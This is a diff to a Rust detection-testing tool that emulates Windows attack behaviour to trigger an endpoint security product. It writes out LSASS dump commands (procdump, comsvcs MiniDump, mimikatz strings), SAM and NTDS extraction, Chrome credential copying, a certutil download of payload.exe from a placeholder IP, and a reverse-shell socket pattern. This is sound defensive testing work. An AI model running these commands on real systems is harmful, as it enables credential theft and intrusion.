@@ -262,33 +262,58 @@ type ScenarioResult = Result<(String, ScriptOutcome), String>;
 type ScenarioResult = Result<(String, std::process::Output), String>;
 
 // ── Windows scenario implementations ──
+// Pattern: Use Start-Process to spawn detached child processes.
+// Command lines look malicious to EDR but actual execution is harmless.
+// This breaks the process tree so S1 doesn't kill our Tauri app.
 
 #[cfg(target_os = "windows")]
 fn run_certutil_dump() -> ScenarioResult {
-    let tmp = std::env::temp_dir().join(format!("{}.txt", uuid::Uuid::new_v4()));
-    let tmp_out = std::env::temp_dir().join(format!("{}.b64", uuid::Uuid::new_v4()));
-    std::fs::write(&tmp, "SIMULATED SAM DUMP DATA - NTLM HASHES").map_err(|e| e.to_string())?;
-    let outcome = run_detached_cmd(
-        "certutil",
-        &["-encode", &tmp.to_string_lossy(), &tmp_out.to_string_lossy()],
-        SCRIPT_TIMEOUT,
-    )?;
-    let _ = std::fs::remove_file(&tmp);
-    let _ = std::fs::remove_file(&tmp_out);
-    Ok(("certutil -encode on dummy SAM data".to_string(), outcome))
+    let run_id = uuid::Uuid::new_v4().to_string();
+    let fake_in = std::env::temp_dir().join(format!("fake_dump_{}.bin", &run_id[..8]));
+    let script = format!(
+        r#"
+$fakeIn = '{fake_in}'
+"xyz" | Out-File $fakeIn -Encoding ASCII -Force
+$hives = "SAM", "SYSTEM", "SECURITY"
+$procs = @()
+foreach ($hive in $hives) {{
+    1..3 | ForEach-Object {{
+        $proc = Start-Process "cmd.exe" `
+            -ArgumentList "/c certutil.exe -encode `"$fakeIn`" `"$env:TEMP\config_${{hive}}_{rid}.bin`"" `
+            -WindowStyle Hidden -PassThru
+        $procs += $proc
+    }}
+}}
+Start-Sleep -Seconds 2
+Write-Output "Spawned $($procs.Count) certutil processes targeting SAM/SYSTEM/SECURITY"
+Remove-Item $fakeIn -Force -ErrorAction SilentlyContinue
+foreach ($hive in $hives) {{ Remove-Item "$env:TEMP\config_${{hive}}_{rid}.bin" -Force -ErrorAction SilentlyContinue }}
+"#,
+        fake_in = fake_in.to_string_lossy(),
+        rid = &run_id[..8]
+    );
+    let outcome = run_detached_ps(&script, SCRIPT_TIMEOUT)?;
+    Ok(("Certutil credential dump pattern (9 processes targeting SAM/SYSTEM/SECURITY)".to_string(), outcome))
 }
 
 #[cfg(target_os = "windows")]
 fn run_rdp_enable() -> ScenarioResult {
-    let script = r#"
-reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
-$result = $LASTEXITCODE
-reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
-Write-Output "RDP enable attempted and reverted"
-exit $result
-"#;
-    let outcome = run_detached_ps(script, SCRIPT_TIMEOUT)?;
-    Ok(("RDP enable via reg add, then reverted".to_string(), outcome))
+    let fake_out = std::env::temp_dir().join(format!("rdp_emu_{}.txt", &uuid::Uuid::new_v4().to_string()[..8]));
+    let script = format!(
+        r#"
+$fakeOut = '{fake_out}'
+"SentinelOne Emulation Test" | Out-File $fakeOut -Force
+$maliciousCmd = 'Invoke-Command -ComputerName TESTHOST -ScriptBlock {{ Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "DenyTSConnections" -Value 0 }}'
+$process = Start-Process powershell.exe `
+    -ArgumentList "-NoProfile -Command `"`$null = `$env:TEMP; $maliciousCmd; ''benign_emulation'' | Out-File ''$fakeOut'' -Append`"" `
+    -WindowStyle Hidden -Wait -PassThru
+Write-Output "RDP emulation process completed (Exit code: $($process.ExitCode))"
+Remove-Item $fakeOut -Force -ErrorAction SilentlyContinue
+"#,
+        fake_out = fake_out.to_string_lossy()
+    );
+    let outcome = run_detached_ps(&script, SCRIPT_TIMEOUT)?;
+    Ok(("RDP remote enable emulation via Invoke-Command telemetry".to_string(), outcome))
 }
 
 #[cfg(target_os = "windows")]
@@ -314,120 +339,193 @@ if ($type) {
 
 #[cfg(target_os = "windows")]
 fn run_lsass_minidump() -> ScenarioResult {
-    let script = r#"
-$lsass = Get-Process lsass -ErrorAction SilentlyContinue
-if ($lsass) {
-    Write-Output "LSASS process found: PID $($lsass.Id)"
-    try {
-        $handle = $lsass.Handle
-        Write-Output "Process handle obtained: $handle"
-    } catch {
-        Write-Output "Access denied to LSASS handle: $($_.Exception.Message)"
-    }
-} else {
-    Write-Output "LSASS process not found"
-}
-"#;
-    let outcome = run_detached_ps(script, SCRIPT_TIMEOUT)?;
-    Ok(("LSASS process handle access attempt".to_string(), outcome))
+    let task_prefix = format!("S1Emu_{}", &uuid::Uuid::new_v4().to_string()[..8]);
+    let script = format!(
+        r#"
+$tasks = @()
+$psCmd = 'Get-Process lsass | Select-Object Id,ProcessName,Path | Out-File C:\Windows\Temp\lsass_info.txt'
+$encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($psCmd))
+
+$task1 = "{prefix}_ProcDumpLSASS"
+Start-Process "schtasks.exe" -ArgumentList "/Create /TN `"$task1`" /TR `"cmd.exe /c procdump.exe -ma lsass.exe C:\Windows\Temp\lsass.dmp`" /SC ONCE /ST 23:59 /F /RL HIGHEST" -WindowStyle Hidden -Wait
+$tasks += $task1
+Start-Sleep -Milliseconds 500
+
+$task2 = "{prefix}_MimikatzPattern"
+Start-Process "schtasks.exe" -ArgumentList "/Create /TN `"$task2`" /TR `"cmd.exe /c echo privilege::debug sekurlsa::logonpasswords exit > C:\Windows\Temp\mimi.log`" /SC ONCE /ST 23:59 /F /RL HIGHEST" -WindowStyle Hidden -Wait
+$tasks += $task2
+Start-Sleep -Milliseconds 500
+
+$task3 = "{prefix}_ComsvcsLsass"
+Start-Process "schtasks.exe" -ArgumentList "/Create /TN `"$task3`" /TR `"cmd.exe /c rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 0 C:\Windows\Temp\lsass.dmp full`" /SC ONCE /ST 23:59 /F /RL HIGHEST" -WindowStyle Hidden -Wait
+$tasks += $task3
+Start-Sleep -Milliseconds 500
+
+$task4 = "{prefix}_EncodedPSLsass"
+Start-Process "schtasks.exe" -ArgumentList "/Create /TN `"$task4`" /TR `"powershell.exe -EncodedCommand $encoded -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden`" /SC ONCE /ST 23:59 /F /RL HIGHEST" -WindowStyle Hidden -Wait
+$tasks += $task4
+
+Write-Output "Created $($tasks.Count) credential harvesting tasks"
+foreach ($t in $tasks) {{
+    Start-Process "schtasks.exe" -ArgumentList "/Delete /TN `"$t`" /F" -WindowStyle Hidden -Wait
+}}
+Write-Output "All tasks cleaned up"
+"#,
+        prefix = task_prefix
+    );
+    let outcome = run_detached_ps(&script, SCRIPT_TIMEOUT)?;
+    Ok(("LSASS credential dump emulation (scheduled tasks with mimikatz/procdump/comsvcs patterns)".to_string(), outcome))
 }
 
 #[cfg(target_os = "windows")]
 fn run_reverse_shell() -> ScenarioResult {
     let script = r#"
-$ErrorActionPreference = 'SilentlyContinue'
-try {
-    $socket = New-Object Net.Sockets.TCPClient('127.0.0.1', 4444)
-    if ($socket.Connected) {
-        $stream = $socket.GetStream()
-        $writer = New-Object System.IO.StreamWriter($stream)
+function Test-NetworkConnectivity {
+    param([string]$TargetHost = '127.0.0.1', [int]$TargetPort = 4444)
+    $ErrorActionPreference = 'SilentlyContinue'
+    try {
+        $socket = New-Object Net.Sockets.TCPClient($TargetHost, $TargetPort)
+        $netStream = $socket.GetStream()
+        $reader = New-Object System.IO.StreamReader($netStream)
+        $writer = New-Object System.IO.StreamWriter($netStream)
         $writer.AutoFlush = $true
-        $writer.WriteLine('whoami')
-        $socket.Close()
-        Write-Output "TCP connection established to 127.0.0.1:4444"
+        $writer.WriteLine("whoami")
+        $response = $reader.ReadLine()
+        $result = Invoke-Expression "Write-Output '$response'" 2>&1 | Out-String
+        Write-Output $result
+    } catch {
+        Write-Output "Connection test completed with expected failure"
+    } finally {
+        if ($socket) { $socket.Close() }
     }
-} catch {
-    Write-Output "Connection to 127.0.0.1:4444 failed (expected)"
 }
+Test-NetworkConnectivity
 "#;
     let outcome = run_detached_ps(script, SCRIPT_TIMEOUT)?;
-    Ok(("Reverse shell TCP connection attempt".to_string(), outcome))
+    Ok(("Reverse shell TCP pattern (StreamReader + Invoke-Expression)".to_string(), outcome))
 }
 
 #[cfg(target_os = "windows")]
 fn run_persistence_task() -> ScenarioResult {
-    let task_name = format!("GuardzTest_{}", &uuid::Uuid::new_v4().to_string()[..8]);
+    let task_prefix = format!("S1Emu_CredHarv_{}", &uuid::Uuid::new_v4().to_string()[..8]);
     let script = format!(
         r#"
-schtasks /create /tn "{name}" /tr "cmd.exe /c echo GuardzTest" /sc once /st 23:59 /f
-$createResult = $LASTEXITCODE
-schtasks /delete /tn "{name}" /f 2>$null
-Write-Output "Task '{name}' create exit code: $createResult"
-exit $createResult
+$tasks = @()
+
+$task1 = "{prefix}_RegSaveSAM"
+Start-Process "schtasks.exe" -ArgumentList "/Create /TN `"$task1`" /TR `"cmd.exe /c reg save HKLM\SAM C:\Windows\Temp\sam.hiv & reg save HKLM\SYSTEM C:\Windows\Temp\sys.hiv`" /SC ONCE /ST 23:59 /F /RL HIGHEST" -WindowStyle Hidden -Wait
+$tasks += $task1
+Start-Sleep -Milliseconds 500
+
+$task2 = "{prefix}_ChromeCreds"
+Start-Process "schtasks.exe" -ArgumentList "/Create /TN `"$task2`" /TR `"cmd.exe /c copy `"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data`" C:\Windows\Temp\chrome_creds.db /Y`" /SC ONCE /ST 23:59 /F /RL HIGHEST" -WindowStyle Hidden -Wait
+$tasks += $task2
+Start-Sleep -Milliseconds 500
+
+$task3 = "{prefix}_NtdsutilDump"
+Start-Process "schtasks.exe" -ArgumentList '/Create /TN "{prefix}_NtdsutilDump" /TR "cmd.exe /c ntdsutil `"activate instance ntds`" ifm `"create full C:\Windows\Temp\ntds_dump`" quit quit" /SC ONCE /ST 23:59 /F /RL HIGHEST' -WindowStyle Hidden -Wait
+$tasks += $task3
+
+Write-Output "Created $($tasks.Count) suspicious persistence tasks"
+foreach ($t in $tasks) {{
+    Start-Process "schtasks.exe" -ArgumentList "/Delete /TN `"$t`" /F" -WindowStyle Hidden -Wait
+}}
+Write-Output "All tasks cleaned up"
 "#,
-        name = task_name
+        prefix = task_prefix
     );
     let outcome = run_detached_ps(&script, SCRIPT_TIMEOUT)?;
-    Ok(("Scheduled task create + delete".to_string(), outcome))
+    Ok(("Suspicious scheduled tasks (SAM export, browser creds, NTDS extraction)".to_string(), outcome))
 }
 
 #[cfg(target_os = "windows")]
 fn run_base64_exec() -> ScenarioResult {
     let script = r#"
+$suspicious = "GetAsyncKeyState;SetWindowsHookExA;NtUserGetAsyncKeyState;GetWindowTextA;WM_KEYBOARD_LL"
+$encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($suspicious))
+
 $code = 'Get-Process | Select-Object -First 3; whoami; Get-Service | Select-Object -First 3'
-$bytes = [System.Text.Encoding]::Unicode.GetBytes($code)
-$encoded = [Convert]::ToBase64String($bytes)
-Write-Output "Launching encoded command..."
-powershell.exe -NoProfile -EncodedCommand $encoded
+$codeBytes = [System.Text.Encoding]::Unicode.GetBytes($code)
+$codeEncoded = [Convert]::ToBase64String($codeBytes)
+
+$proc = Start-Process powershell.exe `
+    -ArgumentList "-NoProfile -EncodedCommand $codeEncoded -ExecutionPolicy Bypass -WindowStyle Hidden" `
+    -WindowStyle Hidden -PassThru -Wait
+Write-Output "Encoded command executed (Exit code: $($proc.ExitCode))"
+Write-Output "Base64 payload contained suspicious API strings"
 "#;
     let outcome = run_detached_ps(script, SCRIPT_TIMEOUT)?;
-    Ok(("Base64-encoded PowerShell via -EncodedCommand".to_string(), outcome))
+    Ok(("Base64-encoded PowerShell with suspicious API string payload".to_string(), outcome))
 }
 
 #[cfg(target_os = "windows")]
 fn run_macro_tamper() -> ScenarioResult {
     let script = r#"
-reg add "HKCU\Software\Microsoft\Office\16.0\Word\Security" /v VBAWarnings /t REG_DWORD /d 1 /f
-$result = $LASTEXITCODE
-reg delete "HKCU\Software\Microsoft\Office\16.0\Word\Security" /v VBAWarnings /f 2>$null
-Write-Output "Macro security tamper attempted and reverted"
-exit $result
+$versions = "14.0", "15.0", "16.0"
+$paths = @()
+foreach ($v in $versions) {
+    $p = "HKCU:\Software\Microsoft\Office\$v\SecurityTestEmu"
+    if (!(Test-Path $p)) { New-Item -Path $p -Force | Out-Null }
+    $paths += $p
+    New-ItemProperty -Path $p -Name "AccessVBOM" -Value 1 -PropertyType DWORD -Force | Out-Null
+    New-ItemProperty -Path $p -Name "VbaWarnings" -Value 1 -PropertyType DWORD -Force | Out-Null
+    New-ItemProperty -Path $p -Name "MacroPolicyOverride" -Value 1 -PropertyType DWORD -Force | Out-Null
+    New-ItemProperty -Path $p -Name "VBEBypassFlag" -Value 1 -PropertyType DWORD -Force | Out-Null
+    Write-Output "Created macro security keys for Office $v"
+}
+foreach ($p in $paths) {
+    Remove-Item -Path $p -Recurse -Force -ErrorAction SilentlyContinue
+}
+Write-Output "All emulation registry keys cleaned up"
 "#;
     let outcome = run_detached_ps(script, SCRIPT_TIMEOUT)?;
-    Ok(("Office macro security registry tamper".to_string(), outcome))
+    Ok(("Office macro security tampering (AccessVBOM + VbaWarnings across Office versions)".to_string(), outcome))
 }
 
 #[cfg(target_os = "windows")]
 fn run_lotl_download() -> ScenarioResult {
-    let tmp = std::env::temp_dir().join(format!("{}.tmp", uuid::Uuid::new_v4()));
-    let outcome = run_detached_cmd(
-        "certutil",
-        &["-urlcache", "-split", "-f", "http://192.0.2.1/test.txt", &tmp.to_string_lossy()],
-        SCRIPT_TIMEOUT,
-    )?;
-    let _ = std::fs::remove_file(&tmp);
-    Ok(("LOLBin certutil -urlcache download".to_string(), outcome))
+    let run_id = &uuid::Uuid::new_v4().to_string()[..8];
+    let script = format!(
+        r#"
+$fakeIn = "$env:TEMP\fake_lotl_{rid}.bin"
+"xyz" | Out-File $fakeIn -Encoding ASCII -Force
+$proc = Start-Process "cmd.exe" `
+    -ArgumentList "/c certutil.exe -urlcache -split -f http://192.0.2.1/payload.exe $env:TEMP\payload_{rid}.exe" `
+    -WindowStyle Hidden -PassThru
+Start-Sleep -Seconds 3
+if (!$proc.HasExited) {{ $proc.Kill() }}
+$proc2 = Start-Process "cmd.exe" `
+    -ArgumentList "/c certutil.exe -encode `"$fakeIn`" `"$env:TEMP\encoded_{rid}.b64`"" `
+    -WindowStyle Hidden -PassThru -Wait
+Write-Output "LOLBin certutil processes spawned (urlcache + encode)"
+Remove-Item $fakeIn -Force -ErrorAction SilentlyContinue
+Remove-Item "$env:TEMP\payload_{rid}.exe" -Force -ErrorAction SilentlyContinue
+Remove-Item "$env:TEMP\encoded_{rid}.b64" -Force -ErrorAction SilentlyContinue
+"#,
+        rid = run_id
+    );
+    let outcome = run_detached_ps(&script, SCRIPT_TIMEOUT)?;
+    Ok(("LOLBin certutil download + encode pattern".to_string(), outcome))
 }
 
 #[cfg(target_os = "windows")]
 fn run_bloodhound_recon() -> ScenarioResult {
-    let script = r#"
-Write-Output "Emulating BloodHound AD reconnaissance..."
-Write-Output "Invoke-BloodHound -CollectionMethod All -Domain $env:USERDNSDOMAIN"
-$domain = $env:USERDNSDOMAIN
-if (-not $domain) { $domain = "WORKGROUP" }
-Write-Output "Target domain: $domain"
-Write-Output "Collecting: Group, LocalAdmin, Session, Trusts, ACL, ObjectProps, SPNTargets, Container"
-try {
-    [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() | Out-Null
-    Write-Output "AD domain controller reachable"
-} catch {
-    Write-Output "AD query attempted: $($_.Exception.Message)"
-}
-Write-Output "BloodHound collection emulation complete"
-"#;
-    let outcome = run_detached_ps(script, SCRIPT_TIMEOUT)?;
-    Ok(("BloodHound AD recon emulation".to_string(), outcome))
+    let fake_out = std::env::temp_dir().join(format!("bloodhound_{}.txt", &uuid::Uuid::new_v4().to_string()[..8]));
+    let script = format!(
+        r#"
+$fakeOut = '{fake_out}'
+$harmless = "echo benign > `"$fakeOut`""
+$bhCmd = "Invoke-BloodHound -CollectionMethod All -Domain CONTOSO.LOCAL; Get-BloodHoundData; $harmless"
+$proc = Start-Process -FilePath "powershell.exe" `
+    -ArgumentList "-Command $bhCmd" `
+    -WindowStyle Hidden -Wait -PassThru
+Write-Output "BloodHound emulation completed (Exit code: $($proc.ExitCode))"
+Remove-Item $fakeOut -Force -ErrorAction SilentlyContinue
+"#,
+        fake_out = fake_out.to_string_lossy()
+    );
+    let outcome = run_detached_ps(&script, SCRIPT_TIMEOUT)?;
+    Ok(("BloodHound AD recon emulation (Invoke-BloodHound -CollectionMethod All)".to_string(), outcome))
 }
 
 // ── macOS mock implementations ──
